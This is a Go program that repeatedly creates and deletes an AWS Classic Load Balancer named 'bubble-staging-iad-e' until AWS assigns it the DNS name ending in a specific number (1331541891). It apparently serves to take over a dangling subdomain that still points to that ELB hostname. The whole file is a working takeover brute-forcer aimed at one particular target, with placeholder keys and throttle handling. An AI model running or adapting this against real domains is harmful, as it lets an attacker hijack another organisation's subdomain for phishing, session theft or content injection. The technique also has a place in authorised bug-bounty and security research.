package main

import (
	"fmt"
	"github.com/aws/aws-sdk-go/aws"
	"github.com/aws/aws-sdk-go/aws/awserr"
	"github.com/aws/aws-sdk-go/aws/credentials"
	"github.com/aws/aws-sdk-go/aws/session"
	"github.com/aws/aws-sdk-go/service/elb"
	"strings"
	"time"
)

func checkResult(dnsname string, host string, number string) bool {
	tmp := strings.Split(dnsname, host+"-")[1]
	thisNum := strings.Split(tmp, ".us-east-1.elb.amazonaws.com")[0]
	if thisNum == number {
		fmt.Printf("Got it! %s successfully created", dnsname)
		return true
	}
	return false
}
func main() {
	var requests int64
	found := false
	cname := "bubble-staging-iad-e"
	num := "1331541891"

	sess, err := session.NewSession(&aws.Config{
		Region:      aws.String("us-east-1"),
		Credentials: credentials.NewStaticCredentials("AWSKEY", "AWS_SECRET_KEY", ""),
	})
	if err != nil {
		fmt.Println(err)
	}

	_, err = sess.Config.Credentials.Get()
	if err != nil {
		fmt.Println(err)
	}
	fmt.Println("[*] Session established")

	startTime := time.Now()
	for found != true {
		svc := elb.New(sess)
		input := &elb.CreateLoadBalancerInput{
			Listeners: []*elb.Listener{
				{
					InstancePort:     aws.Int64(80),
					InstanceProtocol: aws.String("HTTP"),
					LoadBalancerPort: aws.Int64(80),
					Protocol:         aws.String("HTTP"),
				},
			},
			LoadBalancerName: aws.String(cname),
			SecurityGroups: []*string{
				aws.String("SEC-GROUP"),
			},
			Subnets: []*string{
				aws.String("subnet-0543c348"),
				aws.String("subnet-12c63b4d"),
			},
		}

		t := time.Since(startTime)
		secs := t.Seconds()
		if secs >= 60 {
			fmt.Printf("[*] Running with %d requests/min\n", requests)
			startTime = time.Now()
			requests = 0
		}

		result, err := svc.CreateLoadBalancer(input)
		if err != nil {
			if aerr, ok := err.(awserr.Error); ok {
				switch aerr.Code() {
				case elb.ErrCodeDuplicateAccessPointNameException:
					fmt.Println(elb.ErrCodeDuplicateAccessPointNameException, aerr.Error())
				case elb.ErrCodeTooManyAccessPointsException:
					fmt.Println(elb.ErrCodeTooManyAccessPointsException, aerr.Error())
				case elb.ErrCodeCertificateNotFoundException:
					fmt.Println(elb.ErrCodeCertificateNotFoundException, aerr.Error())
				case elb.ErrCodeInvalidConfigurationRequestException:
					fmt.Println(elb.ErrCodeInvalidConfigurationRequestException, aerr.Error())
				case elb.ErrCodeSubnetNotFoundException:
					fmt.Println(elb.ErrCodeSubnetNotFoundException, aerr.Error())
				case elb.ErrCodeInvalidSubnetException:
					fmt.Println(elb.ErrCodeInvalidSubnetException, aerr.Error())
				case elb.ErrCodeInvalidSecurityGroupException:
					fmt.Println(elb.ErrCodeInvalidSecurityGroupException, aerr.Error())
				case elb.ErrCodeInvalidSchemeException:
					fmt.Println(elb.ErrCodeInvalidSchemeException, aerr.Error())
				case elb.ErrCodeTooManyTagsException:
					fmt.Println(elb.ErrCodeTooManyTagsException, aerr.Error())
				case elb.ErrCodeDuplicateTagKeysException:
					fmt.Println(elb.ErrCodeDuplicateTagKeysException, aerr.Error())
				case elb.ErrCodeUnsupportedProtocolException:
					fmt.Println(elb.ErrCodeUnsupportedProtocolException, aerr.Error())
				case elb.ErrCodeOperationNotPermittedException:
					fmt.Println(elb.ErrCodeOperationNotPermittedException, aerr.Error())
				default:
					//fmt.Println(aerr.Error())
					fmt.Println("[-] Hit throttle limit. Resting..")
					time.Sleep(400)
					continue
				}
			} else {
				// Print the error, cast err to awserr.Error to get the Code and
				// Message from an error.
				fmt.Println(err.Error())
			}
			return
		}
		requests++
		name := *result.DNSName
		fmt.Printf("Found %s\n", name)
		found = checkResult(name, cname, num)
		if !found {
			input := &elb.DeleteLoadBalancerInput{
				LoadBalancerName: aws.String(cname),
			}
			_, err := svc.DeleteLoadBalancer(input)
			if err != nil {
				fmt.Println("[-] Error deleting load balancer")
				fmt.Println(err)
			}
		}
	}
}
